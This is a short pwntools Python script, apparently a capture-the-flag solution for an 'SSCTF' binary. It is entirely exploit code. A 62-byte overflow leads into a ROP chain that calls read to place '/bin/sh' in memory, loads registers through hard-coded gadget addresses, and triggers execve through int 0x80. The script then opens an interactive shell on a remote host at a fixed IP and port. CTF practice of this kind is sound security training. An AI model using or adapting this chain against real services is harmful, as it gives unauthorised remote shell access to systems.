from pwn import *
from LibcSearcher import *
context(log_level = 'debug')

elf = ELF('./pwn')

# sh: 0x80beebd 0x80ce8a8
# sh_addr = next(elf.search(b'sh\x00'))
sh_addr = 0x80ce8a8
pop_eax_ret_addr = 0x80b89e6
pop_ebx_ret_addr = 0x80481c9
pop_ecx_ret_addr = 0x80df1b9
pop_edx_ret_addr = 0x806efbb
pop_ebp_ret_addr = 0x80483ca
pop_edi_ret_addr = 0x8048480
pop_esi_ret_addr = 0x8048433
pop_esp_ret_addr = 0x80b8996
int_80_addr = 0x806cbb5

# io = process('./pwn')
io = remote('111.200.241.244', 51269)

payload = cyclic(58 + 4) + p32(elf.symbols['read']) + \
		  p32(0x080483c8) + p32(0) + p32(0x80ea200) + p32(0x8) + \
		  p32(pop_eax_ret_addr) + p32(11) + \
		  p32(pop_ebx_ret_addr) + p32(0x80ea200) + p32(pop_ecx_ret_addr) + \
		  p32(0) + p32(pop_edx_ret_addr) + p32(0) + p32(int_80_addr)

io.sendlineafter(b'SSCTF[InPut Data Size]', str(0x80).encode())
# payload = cyclic(58 + 4) + p32(0x80EB010) + \
# 		  p32(elf.symbols['main']) + p32(sh_addr)

io.sendlineafter(b'SSCTF[YourData]', payload)
io.send(b'/bin/sh\x00')
io.interactive()